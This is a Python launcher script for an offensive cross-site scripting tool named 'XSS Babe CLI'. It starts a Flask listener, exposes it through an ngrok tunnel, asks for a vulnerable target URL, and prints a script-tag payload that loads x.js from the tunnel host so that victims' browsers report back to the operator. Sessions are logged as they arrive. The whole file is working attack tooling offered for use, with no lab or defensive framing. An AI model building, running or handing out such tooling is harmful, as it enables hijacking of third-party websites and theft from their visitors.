#!/usr/bin/env python3

import os
import time
import subprocess
import requests
from datetime import datetime

NGROK_PATH = "/usr/local/bin/ngrok"
NGROK_PORT = "5000"
SERVER_FILE = "server.py"
SESSION_LOG_DIR = "session_reports"

def banner():
    print("""
██   ██ ███████ ███████     ██████   █████  ██████  ███████ 
 ██ ██  ██      ██          ██   ██ ██   ██ ██   ██ ██      
  ███   ███████ ███████     ██████  ███████ ██████  █████   
 ██ ██       ██      ██     ██   ██ ██   ██ ██   ██ ██      
██   ██ ███████ ███████     ██████  ██   ██ ██████  ███████                                                            
   XSS Babe CLI - Real-Time Browser Exploits
""")

def start_flask_server():
    print("[+] Starting Flask server...")
    return subprocess.Popen(["python3", SERVER_FILE])

def start_ngrok():
    print("[+] Launching Ngrok tunnel in new terminal window...")
    # Launch ngrok in a separate terminal window
    subprocess.Popen(['x-terminal-emulator', '-e', f'{NGROK_PATH} http {NGROK_PORT}'])
    time.sleep(5)
    try:
        url = requests.get("http://localhost:4040/api/tunnels").json()["tunnels"][0]["public_url"]
        print(f"[+] Ngrok URL: {url}")
        return url
    except Exception as e:
        print("[-] Error fetching Ngrok URL:", e)
        return None

def generate_payload(ngrok_url):
    payload = f'<script src="{ngrok_url}/static/x.js"></script>'
    print("\n[+] Inject this payload into vulnerable parameter or field:\n")
    print(payload)
    return payload

def save_session_log(target_url, payload, ngrok_url):
    if not os.path.exists(SESSION_LOG_DIR):
        os.makedirs(SESSION_LOG_DIR)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_path = os.path.join(SESSION_LOG_DIR, f"{timestamp}.txt")
    with open(report_path, "w") as f:
        f.write(f"Target URL: {target_url}\n")
        f.write(f"Ngrok URL: {ngrok_url}\n")
        f.write(f"Injected Payload: {payload}\n")
        f.write(f"Session Time: {timestamp}\n")
    print(f"[+] Session log saved to {report_path}")

def main():
    banner()
    target_url = input("[?] Enter vulnerable target URL (e.g. https://site.com/?q=): ").strip()
    flask_proc = start_flask_server()
    ngrok_url = start_ngrok()

    if not ngrok_url:
        print("[-] Ngrok tunnel failed. Exiting.")
        return

    payload = generate_payload(ngrok_url)
    save_session_log(target_url, payload, ngrok_url)

    print("\n[+] XSS Babe is live and ready.")
    print("[*] Monitor terminal for incoming logs. CTRL+C to quit.\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        flask_proc.terminate()
        subprocess.run(["pkill", "ngrok"])

if __name__ == "__main__":
    main()
